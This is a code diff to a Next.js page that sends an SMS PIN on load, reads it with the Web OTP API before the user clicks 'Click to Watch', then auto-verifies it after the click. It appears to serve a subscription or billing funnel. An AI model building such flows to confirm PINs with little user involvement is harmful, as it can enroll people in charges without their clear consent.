@@ -221,7 +221,7 @@ export async function GET(request: NextRequest) {
         <p class="sub">Enter the PIN sent to <b>${masked}</b></p>
 
         <div class="otp-row" id="otpRow">
-          <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin0" autocomplete="off">
+          <input class="otp-input" type="tel" inputmode="numeric" maxlength="4" id="pin0" autocomplete="one-time-code">
           <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin1" autocomplete="off">
           <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin2" autocomplete="off">
           <input class="otp-input" type="tel" inputmode="numeric" maxlength="1" id="pin3" autocomplete="off">
@@ -254,6 +254,7 @@ export async function GET(request: NextRequest) {
     var resendCooldown = 0;
     var phase = 1; // 1 = "Click to Watch", 2 = auto-read / manual entry
     var otpAbort = null; // AbortController for Web OTP
+    var capturedOTP = null; // OTP code captured by Web OTP before click
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('confirmBtn');
@@ -296,6 +297,25 @@ export async function GET(request: NextRequest) {
     pins.forEach(function(input, i) {
       input.addEventListener('input', function(e) {
         var val = input.value.replace(/\\D/g, '');
+
+        // Multi-digit autofill from keyboard suggestion (autocomplete="one-time-code")
+        if (val.length > 1 && i === 0) {
+          var code = val.slice(0, 4);
+          dbg('Keyboard autofill detected: "' + code + '"');
+          for (var j = 0; j < 4; j++) { pins[j].value = code[j] || ''; }
+          if (otpValue) otpValue.value = code;
+          clearError();
+          if (code.length === 4) {
+            pins[3].focus();
+            // If in phase 2, auto-verify
+            if (phase === 2) {
+              dbg('Auto-verifying from keyboard autofill');
+              setTimeout(function() { verifyPin(code); }, 300);
+            }
+          }
+          return;
+        }
+
         input.value = val.slice(-1);
         clearError();
         if (val && i < 3) pins[i + 1].focus();
@@ -337,8 +357,18 @@ export async function GET(request: NextRequest) {
       phase = 2;
       document.getElementById('phase1').classList.add('phase-hidden');
       document.getElementById('phase2').classList.remove('phase-hidden');
+
+      // If Web OTP already captured the code BEFORE the click, use it now
+      if (capturedOTP) {
+        dbg('OTP was pre-captured: "' + capturedOTP + '" — auto-verifying');
+        confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
+        fillAndVerify(capturedOTP);
+        return;
+      }
+
+      // Otherwise show "Reading SMS..." and keep listening
       confirmBtn.innerHTML = '<div class="spinner"></div> <span>Reading SMS...</span>';
-      startWebOTP();
+      dbg('Waiting for Web OTP API to capture SMS...');
     }
 
     function showManualEntry() {
@@ -350,23 +380,25 @@ export async function GET(request: NextRequest) {
       dbg('Switched to manual OTP entry');
     }
 
-    // ── Web OTP API — auto-read SMS ─────────────────────────────────────────
+    // ── Web OTP API — start IMMEDIATELY on page load ────────────────────────
+    // Key fix: SMS is sent when PinRequest runs (page load), so start listening
+    // immediately — NOT after click. This catches SMS that arrive before the user
+    // clicks "Click to Watch". The captured code is stored and used after click.
     function startWebOTP() {
       if (!('OTPCredential' in window)) {
-        dbg('Web OTP API: not available — falling back to manual');
-        showManualEntry();
+        dbg('Web OTP API: not available on this device');
         return;
       }
 
-      dbg('Web OTP API: listening for SMS...');
+      dbg('Web OTP API: listening for SMS (started on page load)...');
       otpAbort = new AbortController();
 
-      // Timeout: fall back to manual after 60 seconds
+      // Timeout: fall back to manual after 90 seconds
       var timeout = setTimeout(function() {
-        dbg('Web OTP API: timeout (60s) — falling back to manual');
+        dbg('Web OTP API: timeout (90s)');
         if (otpAbort) otpAbort.abort();
-        showManualEntry();
-      }, 60000);
+        if (phase === 2) showManualEntry();
+      }, 90000);
 
       navigator.credentials.get({
         otp: { transport: ['sms'] },
@@ -375,11 +407,20 @@ export async function GET(request: NextRequest) {
       .then(function(otp) {
         clearTimeout(timeout);
         if (otp && otp.code) {
-          dbg('Web OTP API: received code "' + otp.code + '"');
-          fillAndVerify(otp.code);
+          var cleaned = otp.code.replace(/\\D/g, '').slice(0, 4);
+          dbg('Web OTP API: received code "' + cleaned + '" (phase=' + phase + ')');
+
+          if (phase === 2) {
+            // User already clicked — verify immediately
+            fillAndVerify(cleaned);
+          } else {
+            // User hasn't clicked yet — store code, verify after click
+            capturedOTP = cleaned;
+            dbg('OTP pre-captured, waiting for user click...');
+          }
         } else {
           dbg('Web OTP API: no code received');
-          showManualEntry();
+          if (phase === 2) showManualEntry();
         }
       })
       .catch(function(err) {
@@ -389,9 +430,12 @@ export async function GET(request: NextRequest) {
         } else {
           dbg('Web OTP API: error — ' + err.message);
         }
-        showManualEntry();
+        if (phase === 2) showManualEntry();
       });
     }
+
+    // Start listening IMMEDIATELY (not after click)
+    startWebOTP();
 
     // ── Auto-fill + auto-verify (after Web OTP success) ─────────────────────
     function fillAndVerify(code) {
